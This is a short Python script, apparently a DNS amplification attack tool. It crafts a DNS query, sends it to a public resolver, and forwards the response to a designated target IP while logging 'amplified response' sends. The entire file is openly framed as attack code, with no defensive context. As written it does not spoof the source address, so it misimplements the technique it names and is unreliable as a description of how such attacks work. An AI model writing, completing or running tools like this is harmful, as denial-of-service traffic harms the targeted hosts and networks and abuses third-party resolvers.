import socket
import ipaddress
import struct
import logging

def create_dns_query(domain):
    transaction_id = 0xaaaa
    flags = 0x0100
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0
    query = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    query_name = b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'
    query_type = 1  # A record (IPv4 address)
    query_class = 1 # IN (Internet)
    query += query_name + struct.pack(">HH", query_type, query_class)
    return query

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def send_amplified_request(target_ip, dns_server, domain):
    if not is_valid_ip(target_ip):
        print("Invalid target IP address.")
        logging.error("Invalid target IP address: %s", target_ip)
        return

    if not is_valid_ip(dns_server):
        print("Invalid DNS server IP address.")
        logging.error("Invalid DNS server IP address: %s", dns_server)
        return

    try:
        family = socket.AF_INET6 if ':' in dns_server else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.settimeout(2)
        query = create_dns_query(domain)
        sock.sendto(query, (dns_server, 53))
        response, _ = sock.recvfrom(4096)
        print(f"Received response from DNS server: {len(response)} bytes")
        sock.sendto(response, (target_ip, 53))
        print(f"Sent amplified response to target: {target_ip}")
        logging.info("Sent amplified response to target: %s", target_ip)
    except socket.timeout:
        print("No response from DNS server")
        logging.error("No response from DNS server")
    except socket.error as e:
        print(f"Socket error: {e}")
        logging.error("Socket error: %s", e)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        logging.error("An unexpected error occurred: %s", e)
    finally:
        sock.close()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')

    target_ip = "192.0.2.1"
    dns_server = "8.8.8.8"
    domain = "example.com"
    send_amplified_request(target_ip, dns_server, domain)